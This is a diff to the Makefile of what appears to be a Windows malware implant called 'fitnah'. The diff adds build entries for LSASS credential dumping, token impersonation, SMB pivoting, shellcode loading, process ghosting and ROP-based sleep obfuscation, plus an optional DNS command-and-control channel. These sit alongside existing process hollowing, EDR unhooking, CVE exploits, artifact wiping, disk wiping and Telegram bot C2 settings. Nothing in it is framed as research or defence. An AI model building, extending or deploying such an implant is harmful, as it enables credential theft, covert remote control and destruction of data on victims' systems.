@@ -69,7 +69,8 @@ SRCS_INJECT = ../fitnah/implant/syscall/indirect_syscall.c       \
               ../fitnah/implant/process_hollowing.c               \
               ../fitnah/implant/reflective_loader.c               \
               ../fitnah/implant/loader/bof_loader.c               \
-              ../fitnah/implant/ApiSetMap.c
+              ../fitnah/implant/ApiSetMap.c               \
+              ../fitnah/implant/pivot/smb_pivot.c
 
 # Evasion — Havoc evasion + PEzor pe_refresh (all-DLL unhook)
 SRCS_EVASION = ../fitnah/implant/evasion/foliage_obf.c           \
@@ -84,6 +85,18 @@ SRCS_EVASION = ../fitnah/implant/evasion/foliage_obf.c           \
 SRCS_FLUCTUATE_CPP = ../fitnah/implant/evasion/fluctuate.cpp
 OBJS_FLUCTUATE     = $(OUTDIR)/fluctuate.obj
 
+# Token impersonation (Havoc Token.c / Sliver priv_windows.go — standalone port)
+SRCS_TOKEN = ../fitnah/implant/token/token.c
+
+# LSASS dump — nanodump adapter (syscall-based, no MiniDumpWriteDump)
+SRCS_NANODUMP = ../fitnah/implant/nanodump/nano_lsass.c
+
+# KaynLdr PIC shellcode loader (Cracked5pider MIT) — indirect-syscall wrapper
+SRCS_KAYNLDR = ../fitnah/implant/kaynldr/kaynldr_wrap.c
+
+# Process Ghosting PE executor (hasherezade technique, MIT)
+SRCS_GHOST = ../fitnah/implant/injection/process_ghost.c
+
 # Collection / exploitation
 SRCS_OPS  = ../fitnah/implant/collection/lsass_dump.c \
             ../fitnah/implant/exploits/cve_exploits.c
@@ -92,7 +105,7 @@ SRCS_OPS  = ../fitnah/implant/collection/lsass_dump.c \
 SRCS_IMPACT = ../fitnah/implant/impact/artifact_wipe.c \
               ../fitnah/implant/impact/disk_wipe.c
 
-SRCS = $(SRCS_CORE) $(SRCS_INJECT) $(SRCS_EVASION) $(SRCS_OPS) $(SRCS_IMPACT)
+SRCS = $(SRCS_CORE) $(SRCS_INJECT) $(SRCS_EVASION) $(SRCS_OPS) $(SRCS_IMPACT) $(SRCS_TOKEN) $(SRCS_NANODUMP) $(SRCS_KAYNLDR) $(SRCS_GHOST)
 
 # ── Compiler flags ────────────────────────────────────────────────────────────
 INCLUDES = -Isrc \
@@ -104,7 +117,11 @@ INCLUDES = -Isrc \
            -I../fitnah/implant/impact \
            -I../fitnah/implant/syscall \
            -I../fitnah/implant/loader \
-           -I../fitnah/implant/asm
+           -I../fitnah/implant/token \
+           -I../fitnah/implant/asm \
+           -I../fitnah/implant/nanodump \
+           -I../fitnah/implant/kaynldr \
+           -I../fitnah/implant/injection
 
 DEFINES  = -DFITNAH_BOT_TOKEN=$(TOKEN)   \
            -DFITNAH_CHAT_ID=$(CHAT_ID)   \
@@ -112,11 +129,18 @@ DEFINES  = -DFITNAH_BOT_TOKEN=$(TOKEN)   \
            -DFITNAH_SLEEP=$(SLEEP)       \
            -DFITNAH_JITTER=$(JITTER)
 
+# Optional: DNS C2 fallback (set DNS_DOMAIN=c2.example.com to enable)
+ifdef DNS_DOMAIN
+  DEFINES += -DFITNAH_DNS_DOMAIN=$(DNS_DOMAIN)
+endif
+
 # Sleep obfuscation compile-time selection
 ifeq ($(SLEEP_OBF),fluctuate)
   DEFINES += -DSLEEP_FLUCTUATE -DFLUCTUATE_NA
 else ifeq ($(SLEEP_OBF),ekko)
   DEFINES += -DSLEEP_EKKO
+  # Cracked5pider Ekko NtContinue ROP variant (MIT)
+  SRCS_EVASION += ../fitnah/implant/evasion/ekko_rop.c
 # default: foliage (no extra define needed — always compiled in)
 endif
 
@@ -125,7 +149,7 @@ CFLAGS   = -O2 -s -mwindows -static \
            -Wno-unused-variable
 
 LDFLAGS  = -lwininet -lbcrypt -lntdll -lgdi32 -luser32 -ladvapi32 \
-           -lole32 -loleaut32 -lpsapi -ldbghelp -lstdc++
+           -lole32 -loleaut32 -lpsapi -ldbghelp -lws2_32 -ldnsapi -lstdc++
 
 # ── Targets ───────────────────────────────────────────────────────────────────
 .PHONY: all clean
